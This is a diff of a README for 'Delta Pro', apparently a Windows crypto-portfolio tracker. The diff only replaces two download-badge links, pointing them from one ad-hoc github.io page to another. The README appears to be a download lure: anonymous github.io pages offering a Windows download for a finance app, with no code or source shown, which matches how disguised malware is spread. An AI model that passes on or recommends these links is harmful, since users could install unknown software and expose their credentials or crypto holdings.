@@ -4,7 +4,7 @@
 
 ## 📥 Download Delta Pro for Windows
 
-[![⬇️ Download Delta Pro](https://img.shields.io/badge/Download-Delta%20Pro-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/256)
+[![⬇️ Download Delta Pro](https://img.shields.io/badge/Download-Delta%20Pro-blue?style=for-the-badge&logo=windows)](https://deltaproload.github.io/.github/)
 
 ---
 
@@ -30,7 +30,7 @@ The platform goes beyond simple price tracking by offering advanced features suc
 
 For professional users, Delta Pro offers deeper analytics, historical data comparisons, and multi-device synchronization, ensuring your portfolio is always up to date—no matter where you access it.
 
-[![⬇️ Download Delta Pro](https://img.shields.io/badge/Download-Delta%20Pro-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/256)
+[![⬇️ Download Delta Pro](https://img.shields.io/badge/Download-Delta%20Pro-blue?style=for-the-badge&logo=windows)](https://deltaproload.github.io/.github/)
 
 ---
 
